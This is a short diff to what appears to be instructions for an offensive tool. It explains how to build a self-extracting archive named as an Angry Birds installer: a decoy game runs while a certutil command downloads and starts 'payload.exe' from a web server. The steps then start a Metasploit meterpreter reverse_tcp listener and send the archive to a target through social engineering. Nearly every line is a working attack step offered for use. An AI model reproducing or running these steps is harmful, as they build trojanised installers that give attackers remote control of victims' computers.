@@ -113,6 +113,7 @@
          PAYLOAD TO BE COMPRESSED => screenshot.png (it will not matter what you compress)
          EXECUTE THIS FILE UPON EXTRACTION => AngryBirds.exe (to be executed as decoy application)
          PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f 'http://webserver/payload.exe', '%TEMP%\\payload.exe'; Start-Process '%TEMP%\\payload.exe'
+         SFX FILENAME => AngryBirds_installer (the name of the decoy appl)
 
     5º - start a listenner, and send the sfx archive to target using social enginnering
          msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.69; set lport 666; exploit'
